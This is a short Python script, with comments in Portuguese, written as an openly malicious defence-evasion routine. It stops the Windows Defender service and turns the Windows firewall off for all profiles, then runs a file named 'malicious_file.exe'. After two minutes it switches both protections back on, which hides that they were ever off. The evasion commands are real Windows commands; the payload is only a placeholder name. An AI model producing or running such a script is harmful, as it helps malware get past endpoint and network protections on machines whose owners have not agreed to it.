import os
import time

# Desativa o Windows Defender e o Firewall
os.system("net stop WinDefend")
os.system("netsh advfirewall set allprofiles state off")

# Executa um arquivo malicioso
os.system("malicious_file.exe")

# Espera 2 minutos
time.sleep(120)

# Reativa o Windows Defender e o Firewall
os.system("net start WinDefend")
os.system("netsh advfirewall set allprofiles state on")